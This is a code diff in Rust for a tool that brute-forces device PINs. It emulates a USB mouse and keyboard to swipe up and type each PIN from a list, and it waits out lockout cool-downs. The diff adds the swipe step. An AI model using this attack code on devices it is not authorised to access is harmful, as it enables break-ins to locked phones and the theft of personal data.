@@ -55,11 +55,7 @@ fn main() {
 fn start(settings: Settings) {
     debug!("Starting brute force attack...");
 
-    start_brute_forcing(
-        settings.device,
-        settings.pin_list.iter(),
-        settings.cool_down,
-    );
+    start_brute_forcing(&settings, settings.pin_list.iter());
 }
 
 fn resume(settings: Settings, args: &ResumeArgs) {
@@ -74,24 +70,45 @@ fn resume(settings: Settings, args: &ResumeArgs) {
         }
     };
 
-    start_brute_forcing(settings.device, pin_list.iter(), settings.cool_down);
+    start_brute_forcing(&settings, pin_list.iter());
 }
 
-fn start_brute_forcing(device: String, pin_list: Iter<'_, &str>, cool_down: Vec<CoolDown>) {
+fn start_brute_forcing(settings: &Settings, pin_list: Iter<'_, &str>) {
     let mut cool_down_index = 0;
     let mut cool_down_count = 0;
 
     for pin in pin_list {
-        let mut result = hid::write_to_device_file(&device, pin);
-        let mut attempts = 12;
+        let mut mouse_result = hid::perform_swipe_up(&settings.mouse_device);
+        let mut mouse_attempts = 12;
 
-        while let Err(e) = result {
-            attempts -= 1;
-            warn!("Failed to send pin: {}", pin);
-            debug!("Attempts remaining: {}", attempts);
+        while let Err(e) = mouse_result {
+            mouse_attempts -= 1;
+            warn!("Failed to perform swipe up");
+            debug!("Attempts remaining: {}", mouse_attempts);
             trace!("Error: {}", e);
 
-            if attempts == 0 {
+            if mouse_attempts == 0 {
+                error!("12 failed attempts over 2 minutes, exiting...");
+                exit(126); // Command invoked cannot execute
+            }
+
+            // Wait for 10 seconds before trying again
+            timeout::set_time_out(Duration::from_secs(10), "Retry swipe up in");
+
+            mouse_result = hid::perform_swipe_up(&settings.mouse_device);
+        }
+
+        let mut keyboard_result =
+            hid::send_string_as_keyboard_scan_codes(&settings.keyboard_device, pin);
+        let mut keyboard_attempts = 12;
+
+        while let Err(e) = keyboard_result {
+            keyboard_attempts -= 1;
+            warn!("Failed to send pin: {}", pin);
+            debug!("Attempts remaining: {}", keyboard_attempts);
+            trace!("Error: {}", e);
+
+            if keyboard_attempts == 0 {
                 error!("12 failed attempts over 2 minutes, exiting...");
                 exit(126); // Command invoked cannot execute
             }
@@ -99,19 +116,20 @@ fn start_brute_forcing(device: String, pin_list: Iter<'_, &str>, cool_down: Vec<
             // Wait for 10 seconds before trying again
             timeout::set_time_out(Duration::from_secs(10), "Retry sending pin in");
 
-            result = hid::write_to_device_file(&device, pin);
+            keyboard_result =
+                hid::send_string_as_keyboard_scan_codes(&settings.keyboard_device, pin);
         }
 
         timeout::set_time_out(
-            cool_down[cool_down_index].duration,
+            settings.cool_down[cool_down_index].duration,
             "Pin attempt cool down ends in",
         );
 
-        if cool_down[cool_down_index].count == -1 {
+        if settings.cool_down[cool_down_index].count == -1 {
             continue;
         }
 
-        if cool_down_count != cool_down[cool_down_index].count {
+        if cool_down_count != settings.cool_down[cool_down_index].count {
             cool_down_count += 1;
         } else {
             cool_down_index += 1;
